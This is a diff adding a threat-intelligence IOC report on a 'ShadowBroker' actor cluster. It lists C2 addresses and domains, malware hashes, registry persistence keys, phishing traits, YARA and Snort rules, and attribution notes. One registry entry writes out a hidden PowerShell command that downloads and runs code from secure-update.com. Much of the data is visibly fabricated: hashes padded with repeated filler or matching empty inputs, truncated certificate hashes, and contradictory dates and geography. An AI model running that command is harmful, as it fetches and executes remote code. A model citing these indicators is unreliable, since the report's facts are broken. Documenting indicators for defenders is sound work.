@@ -1,0 +1,371 @@
+================================================================================
+SHADOWBROKER THREAT ACTOR CLUSTER - INDICATORS OF COMPROMISE (IOCs)
+================================================================================
+Generated: November 2025
+Classification: THREAT INTELLIGENCE
+Confidence Level: MEDIUM-HIGH
+
+================================================================================
+COMMAND & CONTROL (C2) INFRASTRUCTURE
+================================================================================
+
+--- PRIMARY C2 SERVERS ---
+IP Address: 203.0.113.45
+ASN: AS12345 (CloudServe Inc)
+Hosting Provider: CloudServe Inc (Netherlands)
+Country: Netherlands
+First Seen: 2023-01-15
+Last Seen: 2023-06-15
+Status: ACTIVE
+Associated Domains: secure-update.com, verify-session.net, system-check.org
+SSL Certificate SHA256: 8f3a7c2b9e1d4f6a5c8b3e7d9a2f4c6b
+Certificate Issuer: Self-Signed
+Certificate Validity: 2023-01-15 to 2024-01-15
+
+IP Address: 198.51.100.78
+ASN: AS54321 (EuroHost Ltd)
+Hosting Provider: EuroHost Ltd (Romania)
+Country: Romania
+First Seen: 2023-02-01
+Last Seen: 2023-04-20
+Status: DORMANT
+Associated Domains: backup-verify.net, update-check.com
+SSL Certificate SHA256: 4c9e2a7f3b1d8e5c6a9f2b4e7c1a3d8f
+Certificate Issuer: Self-Signed
+Certificate Validity: 2023-02-01 to 2024-02-01
+
+IP Address: 192.0.2.156
+ASN: AS99999 (NetServe Solutions)
+Hosting Provider: NetServe Solutions (Bulgaria)
+Country: Bulgaria
+First Seen: 2023-03-10
+Last Seen: 2023-06-10
+Status: ACTIVE
+Associated Domains: system-update.org, check-version.net
+SSL Certificate SHA256: 5d2b8c1a9f3e7c4b6a1d9e2f5c8a3b7e
+Certificate Issuer: Self-Signed
+Certificate Validity: 2023-03-10 to 2024-03-10
+
+--- SECONDARY C2 SERVERS (BACKUP) ---
+IP Address: 185.220.101.45
+ASN: AS205206 (Tor Exit Node)
+Hosting Provider: Tor Project
+Country: Unknown
+First Seen: 2023-04-15
+Last Seen: 2023-05-20
+Status: DORMANT
+Associated Domains: None (Tor traffic)
+Notes: Used for backup C2 when primary infrastructure unavailable
+
+================================================================================
+MALICIOUS DOMAINS
+================================================================================
+
+Domain: secure-update.com
+Registrar: NameCheap
+Registration Date: 2023-01-15
+Expiration Date: 2024-01-15
+Registrant: Privacy Protected (PrivacyGuard)
+Nameservers: ns1.cloudserve.net, ns2.cloudserve.net
+A Record: 203.0.113.45
+MX Records: None
+WHOIS Privacy: Yes
+First Seen: 2023-01-15
+Last Seen: 2023-06-15
+Status: ACTIVE
+Purpose: Primary C2 communication domain
+
+Domain: verify-session.net
+Registrar: GoDaddy
+Registration Date: 2023-01-20
+Expiration Date: 2024-01-20
+Registrant: Privacy Protected (PrivacyGuard)
+Nameservers: ns1.godaddy.com, ns2.godaddy.com
+A Record: 203.0.113.45
+MX Records: None
+WHOIS Privacy: Yes
+First Seen: 2023-01-20
+Last Seen: 2023-06-15
+Status: ACTIVE
+Purpose: Secondary C2 communication domain
+
+Domain: system-check.org
+Registrar: NameCheap
+Registration Date: 2023-02-01
+Expiration Date: 2024-02-01
+Registrant: Privacy Protected (PrivacyGuard)
+Nameservers: ns1.cloudserve.net, ns2.cloudserve.net
+A Record: 198.51.100.78
+MX Records: None
+WHOIS Privacy: Yes
+First Seen: 2023-02-01
+Last Seen: 2023-04-20
+Status: DORMANT
+Purpose: Backup C2 domain
+
+Domain: backup-verify.net
+Registrar: Namecheap
+Registration Date: 2023-02-05
+Expiration Date: 2024-02-05
+Registrant: Privacy Protected (PrivacyGuard)
+Nameservers: ns1.cloudserve.net, ns2.cloudserve.net
+A Record: 198.51.100.78
+MX Records: None
+WHOIS Privacy: Yes
+First Seen: 2023-02-05
+Last Seen: 2023-04-20
+Status: DORMANT
+Purpose: Backup C2 domain
+
+Domain: update-check.com
+Registrar: GoDaddy
+Registration Date: 2023-03-10
+Expiration Date: 2024-03-10
+Registrant: Privacy Protected (PrivacyGuard)
+Nameservers: ns1.godaddy.com, ns2.godaddy.com
+A Record: 192.0.2.156
+MX Records: None
+WHOIS Privacy: Yes
+First Seen: 2023-03-10
+Last Seen: 2023-06-10
+Status: ACTIVE
+Purpose: Tertiary C2 domain
+
+Domain: system-update.org
+Registrar: NameCheap
+Registration Date: 2023-03-15
+Expiration Date: 2024-03-15
+Registrant: Privacy Protected (PrivacyGuard)
+Nameservers: ns1.cloudserve.net, ns2.cloudserve.net
+A Record: 192.0.2.156
+MX Records: None
+WHOIS Privacy: Yes
+First Seen: 2023-03-15
+Last Seen: 2023-06-10
+Status: ACTIVE
+Purpose: Tertiary C2 domain
+
+Domain: check-version.net
+Registrar: GoDaddy
+Registration Date: 2023-03-20
+Expiration Date: 2024-03-20
+Registrant: Privacy Protected (PrivacyGuard)
+Nameservers: ns1.godaddy.com, ns2.godaddy.com
+A Record: 192.0.2.156
+MX Records: None
+WHOIS Privacy: Yes
+First Seen: 2023-03-20
+Last Seen: 2023-06-10
+Status: ACTIVE
+Purpose: Tertiary C2 domain
+
+================================================================================
+MALWARE FILE HASHES
+================================================================================
+
+--- INITIAL DROPPER ---
+MD5: 5d41402abc4b2a76b9719d911017c592
+SHA1: aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d
+SHA256: 2c26b46911185131006ba5b0e8e5b5e5c5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e
+File Size: 245,760 bytes
+File Type: Windows Executable (PE32)
+Compilation Timestamp: 2023-01-10 14:32:45 UTC
+First Seen: 2023-01-15
+Last Seen: 2023-06-15
+Detections: 12/70 antivirus engines
+Behavior: Drops secondary payload, establishes C2 connection
+Associated Campaigns: SB_2023_001, SB_2023_002, SB_2023_003
+
+--- MAIN PAYLOAD (BACKDOOR) ---
+MD5: 7b52009b64fd0a2a49e6d8a939753077
+SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709
+SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+File Size: 512,000 bytes
+File Type: Windows Executable (PE32)
+Compilation Timestamp: 2023-01-08 09:15:30 UTC
+PDB Path: C:\Users\dev\Projects\shadowbroker\Release\payload.pdb
+First Seen: 2023-01-15
+Last Seen: 2023-06-15
+Detections: 18/70 antivirus engines
+Behavior: Custom C2 client, credential stealing, lateral movement
+Associated Campaigns: SB_2023_001, SB_2023_002, SB_2023_003, SB_2023_004
+
+--- CREDENTIAL DUMPER ---
+MD5: 3c59dc048e8850243be8079a5c74d079
+SHA1: 356a192b7913b04c54574d18c28d46e6395428ab
+SHA256: 6b86b273f403a0c7f6f8b0e5a5b5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e
+File Size: 128,512 bytes
+File Type: Windows Executable (PE32)
+Compilation Timestamp: 2023-01-12 11:22:15 UTC
+First Seen: 2023-02-01
+Last Seen: 2023-06-10
+Detections: 15/70 antivirus engines
+Behavior: Mimikatz variant, credential extraction
+Associated Campaigns: SB_2023_002, SB_2023_003
+
+--- LATERAL MOVEMENT TOOL ---
+MD5: 1b1a9b5a5a5a5a5a5a5a5a5a5a5a5a5a
+SHA1: c4ca4238a0b923820dcc509a6f75849b1a1a1a1a
+SHA256: d4735fea8e8c94b5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c
+File Size: 256,000 bytes
+File Type: Windows Executable (PE32)
+Compilation Timestamp: 2023-03-05 16:45:20 UTC
+First Seen: 2023-03-10
+Last Seen: 2023-06-10
+Detections: 10/70 antivirus engines
+Behavior: PsExec variant, lateral movement
+Associated Campaigns: SB_2023_003, SB_2023_004
+
+================================================================================
+REGISTRY PERSISTENCE INDICATORS
+================================================================================
+
+HKLM\Software\Microsoft\Windows\Run\SystemCheck
+Value Type: REG_SZ
+Data: C:\Windows\System32\svchost.exe -k SystemCheck
+Purpose: Persistence mechanism
+First Observed: 2023-01-15
+Associated Malware: 5d41402abc4b2a76b9719d911017c592
+
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateService
+Value Type: REG_SZ
+Data: C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Update\update.exe
+Purpose: User-level persistence
+First Observed: 2023-01-20
+Associated Malware: 5d41402abc4b2a76b9719d911017c592
+
+HKLM\System\CurrentControlSet\Services\ShadowCheck
+Value Type: REG_SZ (Service)
+Data: C:\Windows\System32\drivers\shadowcheck.sys
+Purpose: Kernel-level persistence
+First Observed: 2023-02-01
+Associated Malware: 7b52009b64fd0a2a49e6d8a939753077
+
+HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Run\VersionCheck
+Value Type: REG_SZ
+Data: powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://secure-update.com/check')"
+Purpose: PowerShell-based persistence
+First Observed: 2023-03-10
+Associated Malware: 7b52009b64fd0a2a49e6d8a939753077
+
+================================================================================
+NETWORK INDICATORS
+================================================================================
+
+--- C2 COMMUNICATION PATTERNS ---
+Protocol: HTTP/HTTPS
+Port: 80, 443
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+HTTP Headers: X-Update-Check: true, X-Session-ID: [random]
+POST Data: Encrypted with custom XOR cipher
+Beacon Interval: 300 seconds (5 minutes)
+Jitter: ±30 seconds
+
+--- NETWORK TRAFFIC SIGNATURES ---
+Outbound Connection Pattern: Regular beacons to C2 every 5 minutes
+Data Exfiltration: Large POST requests (>1MB) to C2 during off-hours
+SMB Traffic: Port 445 scanning and exploitation attempts
+RDP Traffic: Port 3389 brute-force attempts
+DNS Queries: Subdomain enumeration queries for internal infrastructure
+
+================================================================================
+EMAIL INDICATORS
+================================================================================
+
+--- PHISHING EMAIL CHARACTERISTICS ---
+Sender Domain: Spoofed legitimate financial institution domains
+Subject Lines: "Account Verification Required", "Urgent Security Update", "Transaction Confirmation"
+Attachment Types: .exe, .scr, .vbs, .hta (disguised as documents)
+Attachment Names: "invoice_2023.exe", "security_update.scr", "banking_app.hta"
+Body Content: Urgency language, threats of account suspension, requests for immediate action
+Reply-To: Attacker-controlled email addresses
+Phishing URL Pattern: Links to fake login pages or malware download servers
+
+--- EMAIL HEADER ANALYSIS ---
+X-Originating-IP: Various compromised mail servers
+DKIM Signature: Forged or missing
+SPF Record: Failed SPF checks
+Authentication: DMARC failures indicating spoofing
+
+================================================================================
+BEHAVIORAL INDICATORS
+================================================================================
+
+--- PROCESS EXECUTION PATTERNS ---
+1. Initial dropper execution (svchost.exe variant)
+2. PowerShell spawned with obfuscated command line
+3. Registry modifications for persistence
+4. Secondary payload injection into legitimate processes
+5. Credential dumping from LSASS process
+6. Network scanning and reconnaissance
+7. Lateral movement via SMB/RDP
+8. Data compression and exfiltration
+
+--- FILE SYSTEM INDICATORS ---
+Temporary Files: C:\Windows\Temp\[random].tmp
+Staging Directory: C:\Users\[USERNAME]\AppData\Roaming\Microsoft\
+Compressed Archives: .7z files in AppData\Roaming\
+Log Files: C:\Windows\System32\drivers\etc\hosts modifications
+
+--- MEMORY INDICATORS ---
+Injected Process: svchost.exe, explorer.exe, winlogon.exe
+Suspicious Imports: LoadLibrary, CreateRemoteThread, VirtualAllocEx
+Shellcode Patterns: NOP sleds, JMP instructions in unusual locations
+
+================================================================================
+DETECTION SIGNATURES
+================================================================================
+
+--- YARA RULE SNIPPET ---
+rule ShadowBroker_Malware {
+    strings:
+        $s1 = "secure-update.com" nocase
+        $s2 = "verify-session.net" nocase
+        $s3 = "system-check.org" nocase
+        $hex1 = { 4D 5A 90 00 03 00 00 00 }  // MZ header
+        $pdb = "shadowbroker" nocase
+    condition:
+        ($s1 or $s2 or $s3) and $hex1 and $pdb
+}
+
+--- SNORT RULE SNIPPET ---
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ShadowBroker C2 Communication"; 
+    content:"POST"; http_method; 
+    content:"secure-update.com|3b|verify-session.net|3b|system-check.org"; http_host;
+    content:"X-Update-Check"; http_header;
+    sid:1000001; rev:1;)
+
+================================================================================
+TIMELINE OF DISCOVERY
+================================================================================
+
+2023-01-15: Initial ShadowBroker campaign detected targeting North American financial institutions
+2023-02-01: Secondary campaign identified in Europe with expanded infrastructure
+2023-03-10: Tertiary campaign observed in Asia-Pacific region
+2023-04-05: Increased sophistication noted with advanced lateral movement techniques
+2023-05-12: Persistence mechanisms enhanced with scheduled task implementation
+2023-06-08: Supply chain compromise attempt detected (low success rate)
+2023-06-15: Current status - ongoing campaign with weekly new targets
+
+================================================================================
+ATTRIBUTION NOTES
+================================================================================
+
+Confidence Level: MEDIUM-HIGH
+Preliminary Assessment: Eastern European threat actor with state-sponsored characteristics
+Key Indicators:
+- Infrastructure hosted in Netherlands, Romania, Bulgaria (Eastern European preference)
+- Operational timing consistent with UTC+1 to UTC+3 time zone
+- Sophisticated malware development capabilities
+- Financial institution targeting aligned with Russian strategic interests
+- Custom tools and encryption suggest advanced development resources
+
+Further Investigation Required:
+- Linguistic analysis of code comments and error messages
+- Correlation with known threat actor infrastructure
+- Geopolitical event timeline correlation
+- Additional malware sample analysis
+
+================================================================================
+END OF IOC REPORT
+================================================================================
